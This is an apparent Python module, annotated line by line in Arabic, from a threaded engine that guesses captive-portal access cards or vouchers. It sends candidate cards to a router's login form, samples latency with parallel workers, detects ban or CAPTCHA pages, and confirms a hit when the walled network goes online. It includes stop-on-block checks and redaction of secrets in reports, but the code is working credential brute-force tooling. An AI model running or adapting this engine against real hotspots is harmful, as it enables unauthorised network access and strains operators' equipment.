        if verdict.code in ("BANNED", "RATE_LIMITED", "CHALLENGE") or r.status in (403, 429):  # شرط مركّب (أو)
            break  # قطع الحلقة فوراً

    if not best:  # شرط معكوس: ليس best
        return p, [], None, trials  # إرجاع مجموعة

    p["pass_mode"] = best["mode"]  # إسناد best['mode'] إلى p['pass_mode']
    p["dst_value"] = best["dst"]  # إسناد best['dst'] إلى p['dst_value']
    if best.get("method"):  # شرط: نتيجة best.get('method')
        p["method"] = best["method"]  # إسناد best['method'] إلى p['method']
    p["send_dst"] = bool(best.get("send_dst"))  # إسناد نتيجة استدعاء bool (معامل واحد) إلى p['send_dst']
    p["send_popup"] = bool(best.get("send_popup"))  # إسناد نتيجة استدعاء bool (معامل واحد) إلى p['send_popup']
    tuned = {k: v for k, v in best.items() if k != "words"}  # بناء قاموس بالاشتقاق وإسناده إلى tuned
    tuned["dst"] = _safe_url_shape(best.get("dst", ""), p)  # إسناد نتيجة استدعاء _safe_url_shape (2 معاملات) إلى tuned['dst']
    return p, best["words"], tuned, trials  # إرجاع مجموعة


def _known_card_preflight(p: dict, card: str, session, internet_before: dict,  # تعريف الدالة _known_card_preflight(p, card, session, internet_before, checks)
                          checks=None):  # المعامل المسمّى checks
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Try the submitted known card once, then verify actual network state.

    The reply may be HTTP 200 without a success marker; a WALLED -> ONLINE
    transition is stronger evidence than response text in that case.
    """  # نهاية النص متعدد الأسطر
    shape = safe_request_shape(p, card)  # إسناد نتيجة استدعاء safe_request_shape (2 معاملات) إلى shape
    try:  # بدايةtry محمية (يليها except/finally)
        resp = send_login(session, p, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى resp
    # تكملة السطر السابق داخل القوس
    except Exception as exc:                              # noqa: BLE001
        err = classify(exc, p.get("login_url", ""))  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
        return p, {**shape, "status": None, "code": "NET_ERROR",  # إرجاع مجموعة
                   "reason": err.kind, "response_bytes": 0,  # مفتاح reason في القاموس
                   "content_type": "", "location": "",  # مفتاح content_type في القاموس
                   "internet_after": None, "logout": None}, None, "", None  # مفتاح internet_after في القاموس

    protective, evidence, ban_ev = _is_protective_reply(resp, p.get("login_url", ""))  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
    if protective:  # شرط: protective
        code = "CHALLENGE" if evidence == "captcha_challenge" else (  # إسناد 'CHALLENGE' إن مقارنة وإلا 'RATE_LIMITED' إن مقارنة وإلا 'BANNED' إلى code
            "RATE_LIMITED" if resp.status == 429 else "BANNED")  # تكملة السطر السابق داخل القوس
        return p, {**shape, "status": resp.status, "code": code,  # إرجاع مجموعة
                   "reason": evidence, "response_bytes": resp.length,  # مفتاح reason في القاموس
                   "content_type": resp.header("content-type").split(";")[0],  # مفتاح content_type في القاموس
                   "location": _safe_url_shape(resp.location, p) if resp.location else "",  # مفتاح location في القاموس
                   "ban_evidence": ban_ev,  # مفتاح ban_evidence في القاموس
                   "internet_after": None, "logout": None}, None, evidence, resp  # مفتاح internet_after في القاموس

    refreshed = absorb_form(p, resp.text or "", resp.url or p.get("login_url", ""))  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى refreshed
    before_state = (internet_before or {}).get("state", "UNKNOWN")  # إسناد نتيجة استدعاء internet_before أو قاموس.get (2 معاملات) إلى before_state
    # أعطِ انتقال البوابة الناجح لحظة ليصل إلى الراوتر قبل
    # الفحص؛ هذا تأخير استقرار قصير، لا انتظار حجب ولا إعادة.
    time.sleep(max(0.0, config.KNOWN_CARD_VERIFY_DELAY_SECONDS))  # استدعاء time.sleep (معامل واحد)
    is_online, after = verify.verify_online(session, checks=checks)  # إسناد نتيجة استدعاء verify.verify_online (معامل واحد، checks=…) إلى مجموعة
    transition = before_state != "ONLINE" and is_online  # دمج منطقي (و) وإسناده إلى transition
    trial = {**shape, "status": resp.status,  # إسناد قاموس إلى trial
             "code": "UNKNOWN", "reason": "pending_rejection_baseline",  # مفتاح code في القاموس
             "response_bytes": resp.length,  # مفتاح response_bytes في القاموس
             "content_type": resp.header("content-type").split(";")[0],  # مفتاح content_type في القاموس
             "location": _safe_url_shape(resp.location, p) if resp.location else "",  # مفتاح location في القاموس
             "internet_before": before_state,  # مفتاح internet_before في القاموس
             "internet_after": after.get("state", "UNKNOWN"),  # مفتاح internet_after في القاموس
             "internet_detail": after.get("detail", ""),  # مفتاح internet_detail في القاموس
             "online_transition": transition,  # مفتاح online_transition في القاموس
             "logout": None}  # مفتاح logout في القاموس
    redirect_out = False  # إسناد القيمة الثابتة redirect_out
    if resp.is_redirect():  # شرط: نتيجة resp.is_redirect()
        host = (resp.location.split("//")[-1].split("/")[0] or "").lower()  # إسناد نتيجة استدعاء resp.location.split('//')[نفي/سالب].split('/')[0] أو ''.lower إلى host
        login_host = (p.get("login_url", "").split("//")[-1].split("/")[0]  # إسناد نتيجة استدعاء p.get('login_url', '').split('//')[نفي/سالب].split('/')[0].lower إلى login_host
                      .lower())  # تكملة السطر السابق داخل القوس
        redirect_out = bool(host and host != login_host)  # إسناد نتيجة استدعاء bool (معامل واحد) إلى redirect_out
    if not transition and not redirect_out:  # شرط مركّب (و)
        return refreshed, trial, None, "", resp  # إرجاع مجموعة

    # حتى لو أوحي التحويل بالنجاح ولم يؤكد الفحص ذلك،
    # أعِد حالة الجدار قبل السماح بأي طلب لاحق.
    logout = verify.logout(session, refreshed.get("login_url", ""))  # إسناد نتيجة استدعاء verify.logout (2 معاملات) إلى logout
    after_logout = verify.probe_internet(session, checks=checks)  # إسناد نتيجة استدعاء verify.probe_internet (معامل واحد، checks=…) إلى after_logout
    trial["logout"] = {"request_ok": bool(logout.get("ok")),  # إسناد قاموس إلى trial['logout']
                       "status": logout.get("status"),  # مفتاح status في القاموس
                       "internet_after": after_logout.get("state", "UNKNOWN")}  # مفتاح internet_after في القاموس
    if after_logout.get("state") != "WALLED":  # شرط: after_logout.get('state') لا يساوي 'WALLED'
        return refreshed, trial, None, "logout_unconfirmed", resp  # إرجاع مجموعة
    if not transition:  # شرط معكوس: ليس transition
        return refreshed, trial, None, "", resp  # إرجاع مجموعة
    tuned = {"method": shape["method"].lower(),  # إسناد قاموس إلى tuned
             "mode": p.get("pass_mode", "empty"),  # مفتاح mode في القاموس
             "pass_mode": p.get("pass_mode", "empty"),  # مفتاح pass_mode في القاموس
             "dst": _safe_url_shape(p.get("dst_value", ""), p),  # مفتاح dst في القاموس
             "send_dst": bool(p.get("send_dst")),  # مفتاح send_dst في القاموس
             "send_popup": bool(p.get("send_popup")),  # مفتاح send_popup في القاموس
             "verified": True, "internet": after.get("detail", ""),  # مفتاح verified في القاموس
             "internet_state": after.get("state", "UNKNOWN"),  # مفتاح internet_state في القاموس
             "trial": trial, "logout": trial["logout"]}  # مفتاح trial في القاموس
    return refreshed, trial, tuned, "", resp  # إرجاع مجموعة


def _new_words(page: str, reference: str, limit: int = 10) -> list:  # تعريف الدالة _new_words(page, reference, limit) ترجع list
    from .fingerprint import diff_words  # استيراد diff_words من الوحدة fingerprint
    return diff_words(page, reference, limit=limit)["new_words"]  # إرجاع diff_words(page, reference, limit=limit)['new_words']


# إخفاقات مرحلة التعلّم التي غالباً عثرة واحدة: مقبس keep-alive
# أغلقه الراوتر، أو راوتر مشغول لثانية. إعادتها تكلّف ثانية؛
# وعدم إعادتها يكلّف المستخدم التشغيل كله («قال انتهى
# ولم يجرّب شيئاً»).
CALIBRATION_RETRYABLE = ("stale", "reset", "read_timeout", "connect_timeout",  # إسناد مجموعة إلى CALIBRATION_RETRYABLE
                         "bad_response", "unknown", "no_rejection_baseline")  # تكملة السطر السابق داخل القوس


def calibration_retryable(error: str) -> bool:  # تعريف الدالة calibration_retryable(error) ترجع bool
    return (error or "") in CALIBRATION_RETRYABLE  # إرجاع مقارنة


def block_caused_by_probes(cal) -> bool:  # تعريف الدالة block_caused_by_probes(cal) ترجع bool
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """True when the router returned a block page during our test cards.

    This is recorded for diagnosis only; the engine never waits out or retries
    an explicit router/network block.
    """  # نهاية النص متعدد الأسطر
    if (cal.error or "") != "blocked_already":  # شرط: cal.error أو '' لا يساوي 'blocked_already'
        return False  # إرجاع False
    return not any(s.get("reason") == "blocked_before_probes"  # إرجاع نفي/سالب
                   for s in cal.steps)  # تكملة السطر السابق داخل القوس


# ---------------------------------------------------------------------------
# التشخيص — تقرير «لماذا يتصرف هكذا»
# ---------------------------------------------------------------------------
def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:  # تعريف الدالة diagnose(profile, threads, log, checks) ترجع dict
    p = store.migrate(profile)  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى p
    out = {"ok": True, "steps": [], "latency": {}, "advice": []}  # إسناد قاموس إلى out
    session = new_session(headers=browser_headers(p, p["login_url"]))  # إسناد نتيجة استدعاء new_session (headers=…) إلى session

    def step(sid, ok, reason, detail=None):  # تعريف الدالة step(sid, ok, reason, detail)
        out["steps"].append({"id": sid, "ok": bool(ok), "reason": reason,  # استدعاء out['steps'].append (معامل واحد)
                             "detail": detail or {}})  # مفتاح detail في القاموس

    try:  # بدايةtry محمية (يليها except/finally)
        t0 = time.time()  # إسناد نتيجة استدعاء time.time إلى t0
        try:  # بدايةtry محمية (يليها except/finally)
            r = session.get(p["login_url"], allow_redirects=True)  # إسناد نتيجة استدعاء session.get (معامل واحد، allow_redirects=…) إلى r
            blocked, evidence, ban_ev = _is_protective_reply(r, p["login_url"])  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
            if blocked:  # شرط: blocked
                step("reach", False, "blocked_before_diagnostic_probes",  # استدعاء step (4 معاملات)
                     {"status": r.status, "evidence": evidence,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                      "ban_evidence": ban_ev})  # مفتاح ban_evidence في القاموس
                out["advice"].append({"reason": "blocked_already",  # استدعاء out['advice'].append (معامل واحد)
                                      "fix": "stop_and_contact_network_admin"})  # مفتاح fix في القاموس
                out["ok"] = False  # إسناد القيمة الثابتة out['ok']
                return out  # إرجاع out
            p = absorb_form(p, r.text or "", r.url or p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p
            step("reach", True, "http_ok", {"status": r.status,  # استدعاء step (4 معاملات)
                                            "ms": round((time.time()-t0)*1000)})  # مفتاح ms في القاموس
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
            step("reach", False, f"net_{err.kind}", {"text": err.text[:200]})  # استدعاء step (4 معاملات)
            out["ok"] = False  # إسناد القيمة الثابتة out['ok']
            return out  # إرجاع out

        out["internet"] = verify.probe_internet(session, checks=checks)  # إسناد نتيجة استدعاء verify.probe_internet (معامل واحد، checks=…) إلى out['internet']
        step("internet", out["internet"]["state"] == "WALLED",  # استدعاء step (4 معاملات)
             f"internet_{out['internet']['state'].lower()}",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
             {k: v for k, v in out["internet"].items() if k != "state"})  # تكملة السطر السابق داخل القوس

        # أبقِ التشخيص الكامل ضمن ميزانية محاولات عامة صغيرة.
        # إن حصلت العيّنة التسلسلية على رد حجب، فلا تبدأ
        # طلبات متوازية إطلاقاً.
        use_threads = max(1, threads or config.DEFAULT_THREADS)  # إسناد نتيجة استدعاء max (2 معاملات) إلى use_threads
        seq_count = max(1, config.DIAGNOSTIC_SAMPLE_LIMIT // 2)  # إسناد نتيجة استدعاء max (2 معاملات) إلى seq_count
        seq = _sample(session, p, seq_count, 1)  # إسناد نتيجة استدعاء _sample (4 معاملات) إلى seq
        out["latency"]["sequential"] = seq  # إسناد seq إلى out['latency']['sequential']
        step("sample_single", seq["errors"] == 0 or seq["error_rate"] < 5,  # استدعاء step (4 معاملات)
             "ok" if seq["errors"] == 0 else "errors_present", seq)  # تكملة السطر السابق داخل القوس

        remaining = max(0, config.DIAGNOSTIC_SAMPLE_LIMIT - seq["sent"])  # إسناد نتيجة استدعاء max (2 معاملات) إلى remaining
        if seq.get("banned") or remaining == 0:  # شرط مركّب (أو)
            par = {"sent": 0, "errors": 0, "codes": {}, "kinds": {},  # إسناد قاموس إلى par
                   "banned": 0, "lat": [], "error_rate": 0.0,  # مفتاح banned في القاموس
                   "avg_ms": 0, "p95_ms": 0, "skipped_after_block": bool(seq.get("banned"))}  # مفتاح avg_ms في القاموس
        else:  # مفتاح else في القاموس
            par = _sample(session, p, remaining, use_threads)  # إسناد نتيجة استدعاء _sample (4 معاملات) إلى par
        out["latency"]["parallel"] = par  # إسناد par إلى out['latency']['parallel']
        step("sample_parallel", par["error_rate"] < 20,  # استدعاء step (4 معاملات)
             "skipped_after_block" if par.get("skipped_after_block") else  # تكملة السطر السابق داخل القوس
             ("ok" if par["error_rate"] < 10 else "errors_rising"), par)  # تكملة السطر السابق داخل القوس

        ban_seen = par.get("banned", 0) + seq.get("banned", 0)  # حساب جمع بين par.get('banned', 0) وseq.get('banned', 0) وإسناده إلى ban_seen
        step("ban_check", ban_seen == 0,  # استدعاء step (4 معاملات)
             "no_ban_seen" if not ban_seen else "ban_page_seen",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
             {"ban_pages": ban_seen})  # تكملة السطر السابق داخل القوس
        if ban_seen:  # شرط: ban_seen
            out["advice"].append({"reason": "blocked_already",  # استدعاء out['advice'].append (معامل واحد)
                                  "fix": "stop_and_contact_network_admin"})  # مفتاح fix في القاموس
        if par["error_rate"] > 20 and seq["error_rate"] <= 5:  # شرط مركّب (و)
            rec = max(2, use_threads // 3)  # إسناد نتيجة استدعاء max (2 معاملات) إلى rec
            out["advice"].append({"reason": "router_pressure",  # استدعاء out['advice'].append (معامل واحد)
                                  "suggest_threads": rec})  # مفتاح suggest_threads في القاموس
        if seq["avg_ms"] > config.SLOW_DIAG_AFTER * 1000:  # شرط: seq['avg_ms'] أكبر من ضرب
            out["advice"].append({"reason": "slow_router"})  # استدعاء out['advice'].append (معامل واحد)
        if out["internet"]["state"] == "ONLINE":  # شرط: out['internet']['state'] يساوي 'ONLINE'
            out["advice"].append({"reason": "already_online_no_captive_portal"})  # استدعاء out['advice'].append (معامل واحد)
        out["ok"] = True  # إسناد القيمة الثابتة out['ok']
        return out  # إرجاع out
    finally:  # مفتاح finally في القاموس
        session.close()  # استدعاء session.close


def _sample(session: Session, p: dict, count: int, threads: int) -> dict:  # تعريف الدالة _sample(session, p, count, threads) ترجع dict
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Send wrong-but-valid cards and measure - never counts them as done.

    Every parallel worker owns one browser-like session.  Creating a bare
    session for each card loses the page cookie and CSRF token and measures
    "bad request" rather than router capacity.
    """  # نهاية النص متعدد الأسطر
    cards = [c for c in bench_cards(p, max(0, min(int(count),  # بناء اشتقاق قائمة وإسناده إلى cards
                                                   config.DIAGNOSTIC_SAMPLE_LIMIT)))]  # تكملة السطر السابق داخل القوس
    stats = {"sent": 0, "errors": 0, "codes": Counter(), "kinds": Counter(),  # إسناد قاموس إلى stats
             "banned": 0, "lat": []}  # مفتاح banned في القاموس
    lock = threading.Lock()  # إسناد نتيجة استدعاء threading.Lock إلى lock
    halt = threading.Event()  # إسناد نتيجة استدعاء threading.Event إلى halt

    def one(sess, live, card):  # تعريف الدالة one(sess, live, card)
        if halt.is_set():  # شرط: نتيجة halt.is_set()
            return live  # إرجاع live
        if live is None:  # شرط: live هو نفسه None
            with lock:  # سياق مُدار: lock
                stats["sent"] += 1  # تحديث stats['sent'] بعملية جمع
                stats["errors"] += 1  # تحديث stats['errors'] بعملية جمع
                stats["kinds"]["no_session"] += 1  # تحديث stats['kinds']['no_session'] بعملية جمع
            return None  # إرجاع None
        t0 = time.time()  # إسناد نتيجة استدعاء time.time إلى t0
        try:  # بدايةtry محمية (يليها except/finally)
            r = send_login(sess, live, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى r
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, live["login_url"])  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
            with lock:  # سياق مُدار: lock
                stats["sent"] += 1  # تحديث stats['sent'] بعملية جمع
                stats["errors"] += 1  # تحديث stats['errors'] بعملية جمع
                stats["kinds"][err.kind] += 1  # تحديث stats['kinds'][err.kind] بعملية جمع
            return live  # إرجاع live
        blocked, _evidence, _ban_ev = _is_protective_reply(r, live["login_url"])  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
        fresh = absorb_form(live, r.text or "", r.url or live["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى fresh
        with lock:  # سياق مُدار: lock
            stats["sent"] += 1  # تحديث stats['sent'] بعملية جمع
            stats["lat"].append(round((time.time() - t0) * 1000))  # استدعاء stats['lat'].append (معامل واحد)
            stats["codes"][r.status] += 1  # تحديث stats['codes'][r.status] بعملية جمع
            if blocked:  # شرط: blocked
                stats["banned"] += 1  # تحديث stats['banned'] بعملية جمع
                halt.set()  # استدعاء halt.set
        return fresh  # إرجاع fresh

    if threads <= 1:  # شرط: threads أصغر أو يساوي 1
        live = p  # إسناد p إلى live
        for card in cards:  # دورة على cards باسم card
            live = one(session, live, card)  # إسناد نتيجة استدعاء one (3 معاملات) إلى live
    else:  # مفتاح else في القاموس
        q = queue.Queue()  # إسناد نتيجة استدعاء queue.Queue إلى q
        for card in cards:  # دورة على cards باسم card
            q.put(card)  # استدعاء q.put (معامل واحد)

        def worker():  # تعريف الدالة worker()
            sess = new_session(for_attack=True,  # إسناد نتيجة استدعاء new_session (for_attack=…، headers=…) إلى sess
                               headers=browser_headers(p, p["login_url"]))  # المعامل المسمّى headers
            try:  # بدايةtry محمية (يليها except/finally)
                try:  # بدايةtry محمية (يليها except/finally)
                    page = sess.get(p["login_url"], allow_redirects=True)  # إسناد نتيجة استدعاء sess.get (معامل واحد، allow_redirects=…) إلى page
                # تكملة السطر السابق داخل القوس
                except Exception:                       # noqa: BLE001
                    page = None  # إسناد القيمة الثابتة page
                if page is not None:  # شرط: page ليس نفسه None
                    blocked, _evidence, _ban_ev = _is_protective_reply(  # إسناد نتيجة استدعاء _is_protective_reply (2 معاملات) إلى مجموعة
                        page, p["login_url"])  # تكملة السطر السابق داخل القوس
                    if blocked:  # شرط: blocked
                        halt.set()  # استدعاء halt.set
                        with lock:  # سياق مُدار: lock
                            stats["banned"] += 1  # تحديث stats['banned'] بعملية جمع
                        return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
                    live = absorb_form(p, page.text or "",  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى live
                                       page.url or p["login_url"])  # تكملة السطر السابق داخل القوس
                else:  # مفتاح else في القاموس
                    live = None  # إسناد القيمة الثابتة live
                while not halt.is_set():  # حلقة ما دام نفي/سالب
                    try:  # بدايةtry محمية (يليها except/finally)
                        card = q.get_nowait()  # إسناد نتيجة استدعاء q.get_nowait إلى card
                    except queue.Empty:  # تكملة السطر السابق داخل القوس
                        return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
                    try:  # بدايةtry محمية (يليها except/finally)
                        live = one(sess, live, card)  # إسناد نتيجة استدعاء one (3 معاملات) إلى live
                    finally:  # مفتاح finally في القاموس
                        q.task_done()  # استدعاء q.task_done
            finally:  # مفتاح finally في القاموس
                sess.close()  # استدعاء sess.close

        ws = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]  # بناء اشتقاق قائمة وإسناده إلى ws
        for w in ws:  # دورة على ws باسم w
            w.start()  # استدعاء w.start
        for w in ws:  # دورة على ws باسم w
            w.join()  # استدعاء w.join

    lat = sorted(stats["lat"])  # إسناد نتيجة استدعاء sorted (معامل واحد) إلى lat
    stats["error_rate"] = round(stats["errors"] / max(stats["sent"], 1) * 100, 1)  # إسناد نتيجة استدعاء round (2 معاملات) إلى stats['error_rate']
    stats["avg_ms"] = round(sum(lat) / len(lat)) if lat else 0  # إسناد round(قسمة) إن lat وإلا 0 إلى stats['avg_ms']
    stats["p95_ms"] = lat[int(len(lat) * 0.95)] if lat else 0  # إسناد lat[int(ضرب)] إن lat وإلا 0 إلى stats['p95_ms']
    stats["codes"] = {str(k): v for k, v in stats["codes"].items()}  # بناء قاموس بالاشتقاق وإسناده إلى stats['codes']
    stats["kinds"] = dict(stats["kinds"])  # إسناد نتيجة استدعاء dict (معامل واحد) إلى stats['kinds']
    return stats  # إرجاع stats


# ---------------------------------------------------------------------------
# محرك التخمين
# ---------------------------------------------------------------------------
_REPORT_SECRET_FIELD = re.compile(  # إسناد نتيجة استدعاء re.compile (2 معاملات) إلى _REPORT_SECRET_FIELD
    r"(pass|pwd|pin|user|card|voucher|token|csrf|nonce|session|chap|"  # تكملة السطر السابق داخل القوس
    r"challenge|cookie|auth|secret|otp)", re.I)  # تكملة السطر السابق داخل القوس


# نسخة البروفايل التي تُحفظ في التقرير: كل قيمة سرّية ⇒ [redacted].
def safe_profile_snapshot(profile: dict) -> dict:  # تعريف الدالة safe_profile_snapshot(profile) ترجع dict
    """Keep debugging shape while removing reusable credentials/live tokens."""  # نص توثيقي (docstring) يشرح ما يليه
    safe = store.migrate(profile or {})  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى safe
    safe["login_url"] = portals.sanitize_login_url(  # إسناد نتيجة استدعاء portals.sanitize_login_url (3 معاملات) إلى safe['login_url']
        safe.get("login_url", ""), safe.get("user_field", "username"),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
        safe.get("pass_field", "password"))  # تكملة السطر السابق داخل القوس
    if safe.get("pass_fixed"):  # شرط: نتيجة safe.get('pass_fixed')
        safe["pass_fixed"] = "[redacted]"  # إسناد القيمة الثابتة safe['pass_fixed']
    chap = safe.get("chap")  # إسناد نتيجة استدعاء safe.get (معامل واحد) إلى chap
    if isinstance(chap, dict):  # شرط: نتيجة isinstance(chap, dict)
        safe["chap"] = {  # إسناد قاموس إلى safe['chap']
            "field": chap.get("field") or safe.get("pass_field", "password"),  # مفتاح field في القاموس
            "id_present": bool(chap.get("id")),  # مفتاح id_present في القاموس
            "challenge_present": bool(chap.get("challenge")),  # مفتاح challenge_present في القاموس
            "values_redacted": True,  # مفتاح values_redacted في القاموس
        }  # إغلاق القوس المفتوح في السطر السابق
    extras = safe.get("extra_fields") or {}  # دمج منطقي (أو) وإسناده إلى extras
    safe["extra_fields"] = {  # بناء قاموس بالاشتقاق وإسناده إلى safe['extra_fields']
        str(name): ("[redacted]" if _REPORT_SECRET_FIELD.search(str(name))  # تكملة السطر السابق داخل القوس
                    and value not in (None, "") else value)  # تكملة السطر السابق داخل القوس
        for name, value in extras.items()  # تكملة السطر السابق داخل القوس
    }  # إغلاق القوس المفتوح في السطر السابق
    return safe  # إرجاع safe


class Engine:  # تعريف الصنف Engine
    """Threaded guessing with live events. One instance per web session."""  # نص توثيقي (docstring) يشرح ما يليه

    def __init__(self, store_obj: store.Store, persist: bool = True, checks=None):  # تعريف الدالة __init__(self, store_obj, persist, checks)
        self.store = store_obj  # إسناد store_obj إلى self.store
        self.persist = persist        # False: تشغيلات تُرمى بعد استخدامها (الاختبار الذاتي)
        self.checks = checks          # تتجاوز روابط «هل نحن متصلون؟»
        self.lock = threading.Lock()  # إسناد نتيجة استدعاء threading.Lock إلى self.lock
        self.state = "idle"  # إسناد القيمة الثابتة self.state
        self.events = deque(maxlen=4000)  # إسناد نتيجة استدعاء deque (maxlen=…) إلى self.events
        self.seq = 0  # إسناد القيمة الثابتة self.seq
        self.thread = None  # إسناد القيمة الثابتة self.thread
        self.stop_event = threading.Event()  # إسناد نتيجة استدعاء threading.Event إلى self.stop_event
        self.started_at = 0.0  # إسناد القيمة الثابتة self.started_at
        self.finished_at = 0.0  # إسناد القيمة الثابتة self.finished_at
        self.profile = {}  # إسناد قاموس إلى self.profile
        self.plan = {}  # إسناد قاموس إلى self.plan
        self.counters = Counter()  # إسناد نتيجة استدعاء Counter إلى self.counters
        self.net_kinds = Counter()  # إسناد نتيجة استدعاء Counter إلى self.net_kinds
        self.reason_counts = Counter()  # إسناد نتيجة استدعاء Counter إلى self.reason_counts
        self.hits = []  # إسناد قائمة إلى self.hits
        self.review = []  # إسناد قائمة إلى self.review
        self.stop_reason = ""  # إسناد القيمة الثابتة self.stop_reason
        self.error = ""  # إسناد القيمة الثابتة self.error
        self.progress = {"attempts": 0, "total": 0, "covered": 0,  # إسناد قاموس إلى self.progress
                         "space": 0, "percent": 0.0}  # مفتاح space في القاموس
        self.speed = 0.0  # إسناد القيمة الثابتة self.speed
        self.latencies = deque(maxlen=500)  # إسناد نتيجة استدعاء deque (maxlen=…) إلى self.latencies
        self.throttle = {"delay_ms": 0, "base_ms": 0, "reason": "", "events": []}  # إسناد قاموس إلى self.throttle
        self.calibration = None  # إسناد القيمة الثابتة self.calibration
        self.diagnostics = None  # إسناد القيمة الثابتة self.diagnostics
        self.verify_enabled = True  # إسناد القيمة الثابتة self.verify_enabled
        self.auto_stop = True  # إسناد القيمة الثابتة self.auto_stop
        self._internet_before = {}  # إسناد قاموس إلى self._internet_before
        self._verification_serialized = False  # إسناد القيمة الثابتة self._verification_serialized
        self._last_event_at = 0.0  # إسناد القيمة الثابتة self._last_event_at
        self._clean_streak = 0  # إسناد القيمة الثابتة self._clean_streak
        self._ban_count = 0  # إسناد القيمة الثابتة self._ban_count
        self._last_ban_evidence = None  # إسناد القيمة الثابتة self._last_ban_evidence
        self._transport_error_streak = 0  # إسناد القيمة الثابتة self._transport_error_streak
        self._recent = deque(maxlen=config.WATCH_SUSPECTS)   # آخر بطاقات جُرّبت
        self._since_check = []      # بطاقات أُرسلت منذ آخر فحص
        self._watch_thread = None  # إسناد القيمة الثابتة self._watch_thread
        self._internet_opened = None   # يُضبط عندما نزل الجدار أثناء التشغيل
        self._rate_count = 0  # إسناد القيمة الثابتة self._rate_count
        self._unknown_saved = 0  # إسناد القيمة الثابتة self._unknown_saved
        self._rejected_since_emit = 0  # إسناد القيمة الثابتة self._rejected_since_emit
        # هذه موجودة حتى قبل أول تشغيل: /api/run/status يُستطلع
        # حال فتح الصفحة ويجب ألا يفشل لمجرد أنه لا يوجد
        # مجمّع خيوط مبني بعد.
        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}  # إسناد قاموس إلى self._pace
        self._pool = None  # إسناد القيمة الثابتة self._pool
        self._unevaluated = 0  # إسناد القيمة الثابتة self._unevaluated
        self._retried = {}  # إسناد قاموس إلى self._retried
        self._pending = []  # إسناد قائمة إلى self._pending
        self._retry_processed = 0  # إسناد القيمة الثابتة self._retry_processed
        self._run_start_pos = 0

    # -- الأحداث ----------------------------------------------------------
    def emit(self, kind: str, payload=None) -> None:  # تعريف الدالة emit(self, kind, payload) ترجع None
        with self.lock:  # سياق مُدار: self.lock
            self.seq += 1  # تحديث self.seq بعملية جمع
            self.events.append({"seq": self.seq, "t": round(time.time(), 3),  # استدعاء self.events.append (معامل واحد)
                                "kind": kind, "data": payload or {}})  # مفتاح kind في القاموس

    def events_since(self, since: int = 0) -> list:  # تعريف الدالة events_since(self, since) ترجع list
        with self.lock:  # سياق مُدار: self.lock
            return [e for e in self.events if e["seq"] > since]  # إرجاع اشتقاق قائمة

    # -- الواجهة العامة ------------------------------------------------------
    def status(self, since: int = 0) -> dict:  # تعريف الدالة status(self, since) ترجع dict
        with self.lock:  # سياق مُدار: self.lock
            now = time.time()  # إسناد نتيجة استدعاء time.time إلى now
            # إسناد طرح إن self.started_at وإلا 0 إلى elapsed
            elapsed = (self.finished_at or now) - self.started_at \
                if self.started_at else 0  # تكملة السطر السابق داخل القوس
            processed = sum(self.counters.values())  # إسناد نتيجة استدعاء sum (معامل واحد) إلى processed
            self.progress["attempts"] = processed   # بطاقات جُرّبت فعلاً
            progress = dict(self.progress)  # إسناد نتيجة استدعاء dict (معامل واحد) إلى progress
            progress["covered"] = self._covered_now(processed)
            progress.setdefault("queued", processed)  # استدعاء progress.setdefault (2 معاملات)
            planned = max(0, int(progress.get("total") or 0))  # إسناد نتيجة استدعاء max (2 معاملات) إلى planned
            progress["percent"] = round(  # إسناد نتيجة استدعاء round (2 معاملات) إلى progress['percent']
                min(100.0, processed / max(planned, 1) * 100), 1)  # تكملة السطر السابق داخل القوس
            self.speed = processed / elapsed if elapsed > 0.05 else 0.0  # إسناد قسمة إن مقارنة وإلا 0.0 إلى self.speed
            # الإعادات تُحسب طلبات، لكنها قد تتجاوز عدد البطاقات الفريدة
            # المخطَّط. نقُصّ الباقي حتى لا تصير النسبة/الزمن المتبقي سالباً أو فوق 100.
            left = max(0, planned - min(processed, planned))  # إسناد نتيجة استدعاء max (2 معاملات) إلى left
            progress["eta_seconds"] = (round(left / self.speed)  # إسناد round(قسمة) إن مقارنة وإلا 0 إلى progress['eta_seconds']
                                       if self.speed > 0.05 else 0)  # تكملة السطر السابق داخل القوس
            progress["threads"] = len((self._pool or {}).get("threads", []))  # إسناد نتيجة استدعاء len (معامل واحد) إلى progress['threads']
            lat = sorted(self.latencies)  # إسناد نتيجة استدعاء sorted (معامل واحد) إلى lat
            return {  # إرجاع قاموس
                "state": self.state,  # مفتاح state في القاموس
                "error": self.error,  # مفتاح error في القاموس
                "profile": self.profile.get("name", ""),  # مفتاح profile في القاموس
                "plan": self.plan,  # مفتاح plan في القاموس
                "counters": dict(self.counters),  # مفتاح counters في القاموس
                "reason_counts": dict(self.reason_counts),  # مفتاح reason_counts في القاموس
